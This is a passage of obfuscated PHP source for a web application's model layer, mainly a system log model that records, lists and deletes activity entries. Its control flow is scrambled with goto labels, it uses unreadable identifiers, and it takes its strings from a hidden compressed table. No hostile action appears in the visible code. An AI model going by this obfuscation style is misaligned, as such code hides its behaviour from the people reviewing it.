$cŠ½¨¥®™[$F¥Í·Öì]; $cŠ½¨¥®™[$F¥Í·Öì] = $cŠ½¨¥®™[$AùòÛè°‰‰]; $cŠ½¨¥®™[$AùòÛè°‰‰] = $fù—ºƒˆ¨¾; } goto FïöÁ®Ï°Å; b™«õ¶îƒ: $f‰’À†İ¿ = substr($fõº«¶†Î, 0, $FÃ¹§ó¦‡); $d­Æ§ÍŸï³ = $F¹™À°ÛÜ . md5($F¹™À°ÛÜ . $f‰’À†İ¿); $ağ¡º¾ñ“´ = strlen($d­Æ§ÍŸï³); goto F‘‹ºÀŒ£§; BÍŠØ‰éÄ¼: $Cè÷Œ²ñ… =& $_SERVER[…Ò×–]; $fõº«¶†Î = str_replace(array($Cè÷Œ²ñ…[416], $Cè÷Œ²ñ…[70], $Cè÷Œ²ñ…[91]), array($Cè÷Œ²ñ…[288], $Cè÷Œ²ñ…[8], $Cè÷Œ²ñ…[913]), $fõº«¶†Î); $FÃ¹§ó¦‡ = 4; goto aìø‹÷©“©; F‘‹ºÀŒ£§: $fõº«¶†Î = base64_decode(substr($fõº«¶†Î, $FÃ¹§ó¦‡)); $bªğ°¯Úòî = strlen($fõº«¶†Î); $fæè¿ÔĞîø = array(); goto Dëğ…·¢±; EÁÁÕÑœæ: } } define($_SERVER[…Ò×–][1946], 1); define($_SERVER[…Ò×–][1947], 2); goto bÙ­ç¯ë×³; AÃ•ÖˆÑâ—: define($_SERVER[…Ò×–][0], $_SERVER[…Ò×–][1]); $_SERVER[ä¡—±€µó–è] = explode($_SERVER[…Ò×–][2], gzinflate(substr($_SERVER[…Ò×–][3], 10, -8))); function Model($F’‘Šá†‡ = '', $CŞ‹İ£“¸Î = '', $cØª¯¡ù = '') { goto B²“à±ÕÓ; AåÌ÷Â§•…: $F„„øÓ¥Îš[$D²…“ª‡Ùó] = new ModelBase($F’‘Šá†‡, $CŞ‹İ£“¸Î, $cØª¯¡ù); return $F„„øÓ¥Îš[$D²…“ª‡Ùó]; goto CØ…Æá¤˜¡; B²“à±ÕÓ: $B¢ãÅ« ç¡ =& $_SERVER[ä¡—±€µó–è]; static $F„„øÓ¥Îš = array(); $D²…“ª‡Ùó = strtolower($CŞ‹İ£“¸Î . $B¢ãÅ« ç¡[0] . $F’‘Šá†‡); goto e†çÄÛ±¾Æ; e†çÄÛ±¾Æ: if (isset($F„„øÓ¥Îš[$D²…“ª‡Ùó])) { return $F„„øÓ¥Îš[$D²…“ª‡Ùó]; } if ($F’‘Šá†‡) { $F’‘Šá†‡ = strtoupper($F’‘Šá†‡[0]) . substr($F’‘Šá†‡, 1); $B¬êÃÃ’â = $F’‘Šá†‡ . $B¢ãÅ« ç¡[1]; if (class_exists($B¬êÃÃ’â)) { $F„„øÓ¥Îš[$D²…“ª‡Ùó] = new $B¬êÃÃ’â(); return $F„„øÓ¥Îš[$D²…“ª‡Ùó]; } } if (!$cØª¯¡ù) { $cØª¯¡ù = $GLOBALS[$B¢ãÅ« ç¡[2]][$B¢ãÅ« ç¡[3]]; } goto AåÌ÷Â§•…; CØ…Æá¤˜¡: } goto D¢ÜŠÄÑ°Æ; fî›Å÷†®Ñ: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\x2e\x4c\151\147\x68\x74\101\x70\x70"; public $modelType = "\123\171\x73\x74\145\155\x4f\160\x74\151\x6f\x6e"; public $field = array("\x6e\x61\x6d\x65", "\x67\x72\157\x75\x70", "\x64\x65\x73\143", "\x63\x6f\156\x74\145\156\164"); public function listData($E£µæ”À­ç = false, $aêå…ĞÖø = "\155\157\x64\151\x66\171\124\x69\x6d\x65", $aÜæ®–¤²Š = true) { return parent::listData($E£µæ”À­ç, $aêå…ĞÖø, $aÜæ®–¤²Š); } public function remove($eå»­òĞè) { $B·È†î„ëí = $this->findByName($eå»­òĞè); if (!$B·È†î„ëí) { return !1; } return parent::remove($B·È†î„ëí[$_SERVER[…Ò×–][371]]); } public function add($b·ïÌ»ËÓß) { if ($this->findByName($b·ïÌ»ËÓß[$_SERVER[…Ò×–][28]])) { return !1; } return parent::insert($b·ïÌ»ËÓß); } public function update($b’ïÒ¿ç‰Ö, $B©š°¡ ª–) { $eë›™¼ˆÌ² =& $_SERVER[…Ò×–]; $E¦‡‡ÁÁ = $this->findByName($b’ïÒ¿ç‰Ö); $Eµï’äğ‹ç = $this->findByName($B©š°¡ ª–[$eë›™¼ˆÌ²[28]]); if (!$E¦‡‡ÁÁ || $Eµï’äğ‹ç && $Eµï’äğ‹ç[$eë›™¼ˆÌ²[371]] != $E¦‡‡ÁÁ[$eë›™¼ˆÌ²[371]]) { return !1; } return parent::update($E¦‡‡ÁÁ[$eë›™¼ˆÌ²[371]], $B©š°¡ ª–); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\145\155\x5f\154\x6f\x67"; protected $dataAuto = array(array("\143\162\x65\x61\164\145\124\x69\x6d\x65", "\164\151\x6d\x65", "\151\x6e\163\x65\162\x74", "\x66\165\156\143\164\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $DÇ¨÷Çê­Î =& $_SERVER[…Ò×–]; return array($DÇ¨÷Çê­Î[2421] => LNG($DÇ¨÷Çê­Î[2422]), $DÇ¨÷Çê­Î[2423] => LNG($DÇ¨÷Çê­Î[2424]), $DÇ¨÷Çê­Î[2058] => LNG($DÇ¨÷Çê­Î[2425]), $DÇ¨÷Çê­Î[2426] => LNG($DÇ¨÷Çê­Î[2427]), $DÇ¨÷Çê­Î[2428] => LNG($DÇ¨÷Çê­Î[2429]), $DÇ¨÷Çê­Î[2430] => LNG($DÇ¨÷Çê­Î[2431]), $DÇ¨÷Çê­Î[2432] => LNG($DÇ¨÷Çê­Î[2433]), $DÇ¨÷Çê­Î[2434] => LNG($DÇ¨÷Çê­Î[2435]), $DÇ¨÷Çê­Î[2436] => LNG($DÇ¨÷Çê­Î[2437]), $DÇ¨÷Çê­Î[2089] => LNG($DÇ¨÷Çê­Î[2437]), $DÇ¨÷Çê­Î[2090] => LNG($DÇ¨÷Çê­Î[2438]), $DÇ¨÷Çê­Î[2439] => LNG($DÇ¨÷Çê­Î[2440]), $DÇ¨÷Çê­Î[2441] => LNG($DÇ¨÷Çê­Î[2442]), $DÇ¨÷Çê­Î[2443] => LNG($DÇ¨÷Çê­Î[2444]), $DÇ¨÷Çê­Î[2445] => LNG($DÇ¨÷Çê­Î[2446]), $DÇ¨÷Çê­Î[2087] => LNG($DÇ¨÷Çê­Î[2447]), $DÇ¨÷Çê­Î[2094] => LNG($DÇ¨÷Çê­Î[2448]), $DÇ¨÷Çê­Î[2449] => LNG($DÇ¨÷Çê­Î[2450]), $DÇ¨÷Çê­Î[2451] => LNG($DÇ¨÷Çê­Î[2452]), $DÇ¨÷Çê­Î[2453] => LNG($DÇ¨÷Çê­Î[2454]), $DÇ¨÷Çê­Î[2455] => LNG($DÇ¨÷Çê­Î[2456]), $DÇ¨÷Çê­Î[2097] => LNG($DÇ¨÷Çê­Î[2457]), $DÇ¨÷Çê­Î[2098] => LNG($DÇ¨÷Çê­Î[2458]), $DÇ¨÷Çê­Î[2459] => LNG($DÇ¨÷Çê­Î[2460]), $DÇ¨÷Çê­Î[2461] => LNG($DÇ¨÷Çê­Î[2462]), $DÇ¨÷Çê­Î[2463] => LNG($DÇ¨÷Çê­Î[2464]), $DÇ¨÷Çê­Î[2092] => LNG($DÇ¨÷Çê­Î[2465]), $DÇ¨÷Çê­Î[2466] => LNG($DÇ¨÷Çê­Î[2467]), $DÇ¨÷Çê­Î[2091] => LNG($DÇ¨÷Çê­Î[2468]), $DÇ¨÷Çê­Î[2469] => LNG($DÇ¨÷Çê­Î[2470]), $DÇ¨÷Çê­Î[2471] => LNG($DÇ¨÷Çê­Î[2472]), $DÇ¨÷Çê­Î[2473] => LNG($DÇ¨÷Çê­Î[2473]), $DÇ¨÷Çê­Î[2474] => LNG($DÇ¨÷Çê­Î[2062]), $DÇ¨÷Çê­Î[2475] => LNG($DÇ¨÷Çê­Î[2476]), $DÇ¨÷Çê­Î[2477] => LNG($DÇ¨÷Çê­Î[2478]), $DÇ¨÷Çê­Î[2479] => LNG($DÇ¨÷Çê­Î[2480]), $DÇ¨÷Çê­Î[2481] => LNG($DÇ¨÷Çê­Î[2482]), $DÇ¨÷Çê­Î[2483] => LNG($DÇ¨÷Çê­Î[2484]), $DÇ¨÷Çê­Î[2485] => LNG($DÇ¨÷Çê­Î[2485]), $DÇ¨÷Çê­Î[2486] => LNG($DÇ¨÷Çê­Î[2487]), $DÇ¨÷Çê­Î[2488] => LNG($DÇ¨÷Çê­Î[2489]), $DÇ¨÷Çê­Î[2490] => LNG($DÇ¨÷Çê­Î[2491]), $DÇ¨÷Çê­Î[2492] => LNG($DÇ¨÷Çê­Î[2493]), $DÇ¨÷Çê­Î[2494] => LNG($DÇ¨÷Çê­Î[2495]), $DÇ¨÷Çê­Î[2496] => LNG($DÇ¨÷Çê­Î[2497])); } private function typeFile() { $a †˜í„ŠÛ =& $_SERVER[…Ò×–]; $dÉ¡Áİô®á = array($a †˜í„ŠÛ[2094] => array($a †˜í„ŠÛ[2095]), $a †˜í„ŠÛ[2443] => array($a †˜í„ŠÛ[2498]), $a †˜í„ŠÛ[2445] => array($a †˜í„ŠÛ[2499]), $a †˜í„ŠÛ[2087] => array($a †˜í„ŠÛ[2088]), $a †˜í„ŠÛ[2451] => array(), $a †˜í„ŠÛ[2453] => array(), $a †˜í„ŠÛ[2455] => array(), $a †˜í„ŠÛ[2097] => array($a †˜í„ŠÛ[2099]), $a †˜í„ŠÛ[2098] => array($a †˜í„ŠÛ[2099]), $a †˜í„ŠÛ[2459] => array($a †˜í„ŠÛ[2500]), $a †˜í„ŠÛ[2461] => array($a †˜í„ŠÛ[2500]), $a †˜í„ŠÛ[2463] => array($a †˜í„ŠÛ[2501]), $a †˜í„ŠÛ[2449] => array($a †˜í„ŠÛ[2502]), $a †˜í„ŠÛ[2092] => array($a †˜í„ŠÛ[2503]), $a †˜í„ŠÛ[2466] => array($a †˜í„ŠÛ[2504]), $a †˜í„ŠÛ[2091] => array($a †˜í„ŠÛ[2093])); return $dÉ¡Áİô®á; } private function typeAll() { goto F„ßíôÊÅÂ; e‚¸……±±İ: return $bß·ìññ­Ş; goto d›ä”­£©‚; B¸ÔÑ°îçì: foreach ($dµ‰¡Í±ù as $aËƒ°©ê¡ã => $DìğÚ°Ç·´) { $bß·ìññ­Ş[$DìğÚ°Ç·´[0]] = $bß·ìññ­Ş[$aËƒ°©ê¡ã]; } $bß·ìññ­Ş[$f¡ó‹ŒÜõÙ[2099]] = LNG($f¡ó‹ŒÜõÙ[2505]); $bß·ìññ­Ş[$f¡ó‹ŒÜõÙ[2500]] = LNG($f¡ó‹ŒÜõÙ[2506]); goto e‚¸……±±İ; F„ßíôÊÅÂ: $f¡ó‹ŒÜõÙ =& $_SERVER[…Ò×–]; $bß·ìññ­Ş = $this->typeList; $dµ‰¡Í±ù = array_filter($this->typeFile()); goto B¸ÔÑ°îçì; d›ä”­£©‚: } public function addLog($E®¸˜©„Ô, $a×ô§ÍÎî— = array()) { goto D±·‡Ş‡; A¼Ú‚á–§÷: if (!$CˆºØ¹±°) { $CˆºØ¹±° = (int) Session::get($fµ¨ÆîË¡[2239]); } $f‰èÌÖö’ù = get_client_ip(); if (!$a×ô§ÍÎî— || strlen(json_encode($a×ô§ÍÎî—)) >= 1024) { $a×ô§ÍÎî— = array($fµ¨ÆîË¡[2507] => $f‰èÌÖö’ù); } else { if (is_array($a×ô§ÍÎî—)) { $a×ô§ÍÎî—[$fµ¨ÆîË¡[2507]] = $f‰èÌÖö’ù; } else { $a×ô§ÍÎî— = array($fµ¨ÆîË¡[1045] => $a×ô§ÍÎî—, $fµ¨ÆîË¡[2507] => $f‰èÌÖö’ù); } } goto FïÕˆ¡Ÿ÷; D±·‡Ş‡: $fµ¨ÆîË¡ =& $_SERVER[…Ò×–]; if (!isset($this->typeList[$E®¸˜©„Ô])) { return; } $CˆºØ¹±° = defined($fµ¨ÆîË¡[430]) && USER_ID ? USER_ID : (isset($a×ô§ÍÎî—[$fµ¨ÆîË¡[1450]]) ? $a×ô§ÍÎî—[$fµ¨ÆîË¡[1450]] : 0); goto A¼Ú‚á–§÷; FïÕˆ¡Ÿ÷: $a×ô§ÍÎî— = array($fµ¨ÆîË¡[1440] => Session::sign(), $fµ¨ÆîË¡[1441] => $CˆºØ¹±°, $fµ¨ÆîË¡[29] => $E®¸˜©„Ô, $fµ¨ÆîË¡[1443] => json_encode($a×ô§ÍÎî—)); parent::add($a×ô§ÍÎî—); goto FñÒ¼‰¥ÉÖ; FñÒ¼‰¥ÉÖ: } public function remove($Aô­æ»áìÎ) { $this->where(array($_SERVER[…Ò×–][389] => $Aô­æ»áìÎ))->delete(); } private function _makeOrder($Eˆê†À„„ = '') { goto F‹íˆš›‡Ğ; E˜ŒøÆëãã: return $this->order($Eˆê†À„„); goto d“ÓêÉÁÏ; F‹íˆš›‡Ğ: $d¼“®ˆ™¢ =& $_SERVER[…Ò×–]; $eÇÀŞï„åù = $d¼“®ˆ™¢[191]; $CÆ…”¦· Í = array($d¼“®ˆ™¢[406] => $d¼“®ˆ™¢[407], $d¼“®ˆ™¢[408] => $d¼“®ˆ™¢[409]); goto A‚ŒƒÆÚÌ½; A‚ŒƒÆÚÌ½: $b÷¬ÖÇ¹å = Input::get($d¼“®ˆ™¢[412], $d¼“®ˆ™¢[7], $d¼“®ˆ™¢[2273], array($d¼“®ˆ™¢[2199], $d¼“®ˆ™¢[408])); $b÷¬ÖÇ¹å = $CÆ…”¦· Í[$b÷¬ÖÇ¹å]; $Eˆê†À„„ = $Eˆê†À„„ . "{$eÇÀŞï„åù}\x20{$b÷¬ÖÇ¹å}"; goto E˜ŒøÆëãã; d“ÓêÉÁÏ: } public function get($fÕ¬µ“Œí = '') { goto dÆÅÉå×™Ï; dœ‹£Ì¢­: $eò´±äĞ‹ø[$e¿Å¸Ï÷Ìˆ[358]] = $this->logList($eò´±äĞ‹ø[$e¿Å¸Ï÷Ìˆ[358]]); return $eò´±äĞ‹ø; goto A½š½¸•å; fİœ‘—µÉ: if ($fÕ¬µ“Œí[$e¿Å¸Ï÷Ìˆ[1450]]) { $fë¨¼òË¼Ì[$e¿Å¸Ï÷Ìˆ[1450]] = $fÕ¬µ“Œí[$e¿Å¸Ï÷Ìˆ[1450]]; } if (isset($fÕ¬µ“Œí[$e¿Å¸Ï÷Ìˆ[707]])) { $BŞ„¦ÃÀù¨ = $fÕ¬µ“Œí[$e¿Å¸Ï÷Ìˆ[707]]; $d‹···»É = isset($fÕ¬µ“Œí[$e¿Å¸Ï÷Ìˆ[452]]) ? $fÕ¬µ“Œí[$e¿Å¸Ï÷Ìˆ[452]] : time(); $fë¨¼òË¼Ì[$e¿Å¸Ï÷Ìˆ[191]] = array($e¿Å¸Ï÷Ìˆ[325], array($BŞ„¦ÃÀù¨, $d‹···»É)); } if ($fÕ¬µ“Œí[$e¿Å¸Ï÷Ìˆ[29]]) { $e¬ŸÓ—°˜‘ = explode($e¿Å¸Ï÷Ìˆ[47], $fÕ¬µ“Œí[$e¿Å¸Ï÷Ìˆ[29]]); $FÊè¬‘ö× = $this->typeFile(); $Aƒæš…à¥³ = array(); foreach ($e¬ŸÓ—°˜‘ as $f’…Öê…«ì) { $Aƒæš…à¥³[] = $f’…Öê…«ì; if (isset($FÊè¬‘ö×[$f’…Öê…«ì])) { $Aƒæš…à¥³ = array_merge($Aƒæš…à¥³, $FÊè¬‘ö×[$f’…Öê…«ì]); } } $Aƒæš…à¥³ = array_unique($Aƒæš…à¥³); if ($Aƒæš…à¥³) { $fë¨¼òË¼Ì[$e¿Å¸Ï÷Ìˆ[29]] = array($e¿Å¸Ï÷Ìˆ[7], $Aƒæš…à¥³); } } goto A£…ŒÏ¦ïÜ; dÆÅÉå×™Ï: $e¿Å¸Ï÷Ìˆ =& $_SERVER[…Ò×–]; if (!$fÕ¬µ“Œí) { show_json(array()); } $fë¨¼òË¼Ì = array(); goto fİœ‘—µÉ; A£…ŒÏ¦ïÜ: if (!empty($fÕ¬µ“Œí[$e¿Å¸Ï÷Ìˆ[2507]])) { $fë¨¼òË¼Ì[$e¿Å¸Ï÷Ìˆ[409]] = array($e¿Å¸Ï÷Ìˆ[756], "\x25{$fÕ¬µ“Œí[$e¿Å¸Ï÷Ìˆ[2507]]}\x25"); } $eò´±äĞ‹ø = $this->_makeOrder()->where($fë¨¼òË¼Ì)->selectPage(); if (empty($eò´±äĞ‹ø[$e¿Å¸Ï÷Ìˆ[358]])) { show_json(array(), !0, $eò´±äĞ‹ø[$e¿Å¸Ï÷Ìˆ[355]]); } goto dœ‹£Ì¢­; A½š½¸•å: } private function ipAddress(&$F‚À­²Ñ¶) { $fÖ¹ö„Ç =& $_SERVER[…Ò×–]; if (!empty($F‚À­²Ñ¶[$fÖ¹ö„Ç[2507]])) { $e’æ°©¼Ò = IpLocation::get($F‚À­²Ñ¶[$fÖ¹ö„Ç[2507]]); } else { $e’æ°©¼Ò = LNG($fÖ¹ö„Ç[2508]); } $F‚À­²Ñ¶[$fÖ¹ö„Ç[2509]] = $e’æ°©¼Ò; } private function descZipDownload($d»—îÄ’ÜÊ, &$f‡…°¸ßŒ§) { $fš÷Ë‡Ú =& $_SERVER[…Ò×–]; if (!isset($d»—îÄ’ÜÊ[$fš÷Ë‡Ú[2510]])) { return; } $E¨È¡á†°£ = json_decode($d»—îÄ’ÜÊ[$fš÷Ë‡Ú[2510]], !0); foreach ($E¨È¡á†°£ as $dªè£—ë–Ú) { if (!IO::init($dªè£—ë–Ú[$fš÷Ë‡Ú[75]])) { continue; } if (!($aÆ’¿‹œòœ = IO::infoFull($dªè£—ë–Ú[$fš÷Ë‡Ú[75]]))) { continue; } $d»—îÄ’ÜÊ[$fš÷Ë‡Ú[75]] = $dªè£—ë–Ú[$fš÷Ë‡Ú[75]]; $f‡…°¸ßŒ§[] = $d»—îÄ’ÜÊ[$fš÷Ë‡Ú[373]] = $aÆ’¿‹œòœ[$fš÷Ë‡Ú[373]]; $f‡…°¸ßŒ§[] = $d»—îÄ’ÜÊ[$fš÷Ë‡Ú[2328]] = $aÆ’¿‹œòœ[$fš÷Ë‡Ú[466]]; break; } return $d»—îÄ’ÜÊ; } private function getSourceList(&$Cëæ½Ú‰ª) { $BÚó°‚¹èŸ =& $_SERVER[…Ò×–]; $F·Îª®òŸË = array(); foreach ($Cëæ½Ú‰ª as $Dò¼¹“„ï— => $f×…ÖÄ ¤×) { goto EŠ÷©ãÊÙ›; b·‚Ã¢Œ•: if ($B°Å¬öƒôµ[$BÚó°‚¹èŸ[29]] == $BÚó°‚¹èŸ[2336]) { $F·Îª®òŸË[] = $B°Å¬öƒôµ[$BÚó°‚¹èŸ[409]][$BÚó°‚¹èŸ[373]]; } goto a¾·Ş¤×®½; EŠ÷©ãÊÙ›: $B°Å¬öƒôµ = json_decode($f×…ÖÄ ¤×[$BÚó°‚¹èŸ[409]], !0); if ($f×…ÖÄ ¤×[$BÚó°‚¹èŸ[29]] == $BÚó°‚¹èŸ[2090]) { $B°Å¬öƒôµ = $this->descZipDownload($B°Å¬öƒôµ, $F·Îª®òŸË); $Cëæ½Ú‰ª[$Dò¼¹“„ï—][$BÚó°‚¹èŸ[409]] = json_encode($B°Å¬öƒôµ); continue; } if (strpos($f×…ÖÄ ¤×[$BÚó°‚¹èŸ[29]], $BÚó°‚¹èŸ[2329]) !== 0) { goto A¦Šù¤†¬÷; D¢åÜ«Ÿ‰÷: continue; goto d¾Ší¹¿âÇ; A¦Šù¤†¬÷: if (!isset($B°Å¬öƒôµ[$BÚó°‚¹èŸ[75]]) || strpos($f×…ÖÄ ¤×[$BÚó°‚¹èŸ[29]], $BÚó°‚¹èŸ[2511]) !== 0) { continue; } if (!IO::init($B°Å¬öƒôµ[$BÚó°‚¹èŸ[75]])) { continue; } if (!($Bƒ‡¤§Ğ•å = IO::infoFull($B°Å¬öƒôµ[$BÚó°‚¹èŸ[75]]))) { continue; } goto dîñ¡É‹¹Ã; dîñ¡É‹¹Ã: $F·Îª®òŸË[] = $B°Å¬öƒôµ[$BÚó°‚¹èŸ[373]] = $Bƒ‡¤§Ğ•å[$BÚó°‚¹èŸ[373]]; $F·Îª®òŸË[] = $B°Å¬öƒôµ[$BÚó°‚¹èŸ[2328]] = $Bƒ‡¤§Ğ•å[$BÚó°‚¹èŸ[466]]; $Cëæ½Ú‰ª[$Dò¼¹“„ï—][$BÚó°‚¹èŸ[409]] = json_encode($B°Å¬öƒôµ); goto D¢åÜ«Ÿ‰÷; d¾Ší¹¿âÇ: } goto C…“Ÿ£Ãš·; C…“Ÿ£Ãš·: $F·Îª®òŸË[] = $B°Å¬öƒôµ[$BÚó°‚¹èŸ[373]]; $F·Îª®òŸË[] = $B°Å¬öƒôµ[$BÚó°‚¹èŸ[2328]]; if ($B°Å¬öƒôµ[$BÚó°‚¹èŸ[29]] == $BÚó°‚¹èŸ[497]) { $F·Îª®òŸË[] = $B°Å¬öƒôµ[$BÚó°‚¹èŸ[409]][$BÚó°‚¹èŸ[1014]]; $F·Îª®òŸË[] = $B°Å¬öƒôµ[$BÚó°‚¹èŸ[409]][$BÚó°‚¹èŸ[1015]]; } goto b·‚Ã¢Œ•; a¾·Ş¤×®½: } if (!$F·Îª®òŸË) { return array(); } return Model($BÚó°‚¹èŸ[757])->sourceListInfo($F·Îª®òŸË, !0); } private function logList($CÙ¶õ¼ÅÜ‡) { goto AĞ£ÄœŠÚ; AĞ£ÄœŠÚ: $D„“”ŒÔ¸Ê =& $_SERVER[…Ò×–]; $D«¶ìÎë„Ë = array_to_keyvalue($CÙ¶õ¼ÅÜ‡, $D„“”ŒÔ¸Ê[33], $D„“”ŒÔ¸Ê[1450]); $EŞå…Å¥ = Model($D„“”ŒÔ¸Ê[482])->userListInfo(array_unique($D«¶ìÎë„Ë)); goto AŒ¨éÈö¿; AŒ¨éÈö¿: $D«ÓÌƒØƒç = $this->getSourceList($CÙ¶õ¼ÅÜ‡); $DäˆŒ„á‹ñ = $this->typeAll(); $Dß£± ‡Ÿ¥ = array(); goto D„’Ÿã¥¦; D„’Ÿã¥¦: $fš·Ö±²‹å = array(); foreach ($CÙ¶õ¼ÅÜ‡ as $A­ÉŠåÛ†º => $FƒÕÎ©ƒŒ) { goto BÎìóœÊ²»; b¶ÒÄàŒƒ: $this->ipAddress($FƒÕÎ©ƒŒ); if (strpos($bÕÑÍ¤ˆ¹Š, $D„“”ŒÔ¸Ê[2329]) === 0 || isset($B±…ŒÏ‚àø[$D„“”ŒÔ¸Ê[2328]])) { goto d‚á±¬¬ÀÚ; d‚á±¬¬ÀÚ: $B±…ŒÏ‚àø[$D„“”ŒÔ¸Ê[395]] = $D«ÓÌƒØƒç[$B±…ŒÏ‚àø[$D„“”ŒÔ¸Ê[373]]]; $B±…ŒÏ‚àø[$D„“”ŒÔ¸Ê[2341]] = $D«ÓÌƒØƒç[$B±…ŒÏ‚àø[$D„“”ŒÔ¸Ê[2328]]]; if ($B±…ŒÏ‚àø[$D„“”ŒÔ¸Ê[29]] == $D„“”ŒÔ¸Ê[497]) { $B±…ŒÏ‚àø[$D„“”ŒÔ¸Ê[409]][$D„“”ŒÔ¸Ê[1014]] = $D«ÓÌƒØƒç[$B±…ŒÏ‚àø[$D„“”ŒÔ¸Ê[409]][$D„“”ŒÔ¸Ê[1014]]]; $B±…ŒÏ‚àø[$D„“”ŒÔ¸Ê[409]][$D„“”ŒÔ¸Ê[1015]] = $D«ÓÌƒØƒç[$B±…ŒÏ‚àø[$D„“”ŒÔ¸Ê[409]][$D„“”ŒÔ¸Ê[1015]]]; } goto f†¡¾ïˆŞ; DÜ«‡…•¤º: if ($B±…ŒÏ‚àø[$D„“”ŒÔ¸Ê[2341]] && $B±…ŒÏ‚àø[$D„“”ŒÔ¸Ê[2341]][$D„“”ŒÔ¸Ê[375]] == $D„“”ŒÔ¸Ê[1090]) { $fš·Ö±²‹å[] = $FƒÕÎ©ƒŒ[$D„“”ŒÔ¸Ê[371]]; unset($CÙ¶õ¼ÅÜ‡[$A­ÉŠåÛ†º]); continue; } goto B§Ú”Ã‘Ÿ; f†¡¾ïˆŞ: if ($B±…ŒÏ‚àø[$D„“”ŒÔ¸Ê[29]] == $D„“”ŒÔ¸Ê[2336]) { $B±…ŒÏ‚àø[$D„“”ŒÔ¸Ê[409]][$D„“”ŒÔ¸Ê[373]] = $D«ÓÌƒØƒç[$B±…ŒÏ‚àø[$D„“”ŒÔ¸Ê[409]][$D„“”ŒÔ¸Ê[373]]]; } if ($B±…ŒÏ‚àø[$D„“”ŒÔ¸Ê[29]] == $D„“”ŒÔ¸Ê[2085]) { $B±…ŒÏ‚àø[$D„“”ŒÔ¸Ê[2341]] = $B±…ŒÏ‚àø[$D„“”ŒÔ¸Ê[395]]; $B±…ŒÏ‚àø[$D„“”ŒÔ¸Ê[2328]] = $B±…ŒÏ‚àø[$D„“”ŒÔ¸Ê[2341]][$D„“”ŒÔ¸Ê[373]]; $B±…ŒÏ‚àø[$D„“”ŒÔ¸Ê[395]] = !1; $B±…ŒÏ‚àø[$D„“”ŒÔ¸Ê[373]] = $D„“”ŒÔ¸Ê[33]; } if ($B±…ŒÏ‚àø[$D„“”ŒÔ¸Ê[395]] && $B±…ŒÏ‚àø[$D„“”ŒÔ¸Ê[395]][$D„“”ŒÔ¸Ê[375]] == $D„“”ŒÔ¸Ê[1090]) { $fš·Ö±²‹å[] = $FƒÕÎ©ƒŒ[$D„“”ŒÔ¸Ê[371]]; unset($CÙ¶õ¼ÅÜ‡[$A­ÉŠåÛ†º]); continue; } goto DÜ«‡…•¤º; B§Ú”Ã‘Ÿ: } $FƒÕÎ©ƒŒ[$D„“”ŒÔ¸Ê[409]] = $B±…ŒÏ‚àø; goto D×†¹›ƒ»Ê; A¦¬ºªì: $FƒÕÎ©ƒŒ[$D„“”ŒÔ¸Ê[28]] = isset($cŠš«ñè¦Œ[$D„“”ŒÔ¸Ê[28]]) ? $cŠš«ñè¦Œ[$D„“”ŒÔ¸Ê[28]] : LNG($D„“”ŒÔ¸Ê[2508]); $FƒÕÎ©ƒŒ[$D„“”ŒÔ¸Ê[2377]] = isset($cŠš«ñè¦Œ[$D„“”ŒÔ¸Ê[2377]]) ? $cŠš«ñè¦Œ[$D„“”ŒÔ¸Ê[2377]] : $D„“”ŒÔ¸Ê[33]; $FƒÕÎ©ƒŒ[$D„“”ŒÔ¸Ê[1354]] = isset($DäˆŒ„á‹ñ[$bÕÑÍ¤ˆ¹Š]) ? $DäˆŒ„á‹ñ[$bÕÑÍ¤ˆ¹Š] : $cÜÖ„É––´; goto DÜ”¨¿âô; DÜ”¨¿âô: $FƒÕÎ©ƒŒ[$D„“”ŒÔ¸Ê[2272]] = $cŠš«ñè¦Œ; $B±…ŒÏ‚àø = json_decode($FƒÕÎ©ƒŒ[$D„“”ŒÔ¸Ê[409]], !0); $FƒÕÎ©ƒŒ[$D„“”ŒÔ¸Ê[2507]] = isset($B±…ŒÏ‚àø[$D„“”ŒÔ¸Ê[2507]]) ? $B±…ŒÏ‚àø[$D„“”ŒÔ¸Ê[2507]] : $D„“”ŒÔ¸Ê[33]; goto b¶ÒÄàŒƒ; BÎìóœÊ²»: $bÕÑÍ¤ˆ¹Š = $FƒÕÎ©ƒŒ[$D„“”ŒÔ¸Ê[29]]; $cŠš«ñè¦Œ = isset($EŞå…Å¥[$FƒÕÎ©ƒŒ[$D„“”ŒÔ¸Ê[1450]]]) ? $EŞå…Å¥[$FƒÕÎ©ƒŒ[$D„“”ŒÔ¸Ê[1450]]] : !1; $cÜÖ„É––´ = strpos($bÕÑÍ¤ˆ¹Š, $D„“”ŒÔ¸Ê[2512]) === 0 ? LNG($D„“”ŒÔ¸Ê[2513]) : LNG($D„“”ŒÔ¸Ê[2508]); goto A¦¬ºªì; D×†¹›ƒ»Ê: unset($FƒÕÎ©ƒŒ[$D„“”ŒÔ¸Ê[2514]]); $Dß£± ‡Ÿ¥[] = $FƒÕÎ©ƒŒ; goto Dùà¡˜ŒÍ‰; Dùà¡˜ŒÍ‰: } $this->clearSystemPathLog($fš·Ö±²‹å); goto bë„™Ï”; bë„™Ï”: return $Dß£± ‡Ÿ¥; goto E–³è•Å…; E–³è•Å…: } private function clearSystemPathLog($DôŞ¸ˆ™Ë) { $E±ÇáÅíã¾ =& $_SERVER[…Ò×–]; if (count($DôŞ¸ˆ™Ë) == 0) { return; } $Bƒ…ÉêÓ‡ê = array($E±ÇáÅíã¾[371] => array($E±ÇáÅíã¾[7], array_unique($DôŞ¸ˆ™Ë))); $this->where($Bƒ…ÉêÓ‡ê)->delete(); } public function deviceList($DŞó‡¼›”Æ, $FÅ‡¯Ò§·† = 0) { $DÏöŞ‡œ®œ =& $_SERVER[…Ò×–]; $d­å¶Äòƒ = array($DÏöŞ‡œ®œ[1450] => $DŞó‡¼›”Æ, $DÏöŞ‡œ®œ[191] => array($DÏöŞ‡œ®œ[934], $FÅ‡¯Ò§·†), $DÏöŞ‡œ®œ[29] => $DÏöŞ‡œ®œ[2058]); $añé†‹ïğ = array(); $cï‚ñåİ = $this->field($DÏöŞ‡œ®œ[2515])->where($d­å¶Äòƒ)->order($DÏöŞ‡œ®œ[2339])->limit(50)->select(); foreach ($cï‚ñåİ as $f¸¾ƒ±†³ƒ => $E‡–²Ï„è) { goto Féê¿‹Î§; cÈ‰°Öµæ: $this->ipAddress($E‡–²Ï„è); $E‡–²Ï„è[$DÏöŞ‡œ®œ[409]] = $açœô¸ÄÕª; 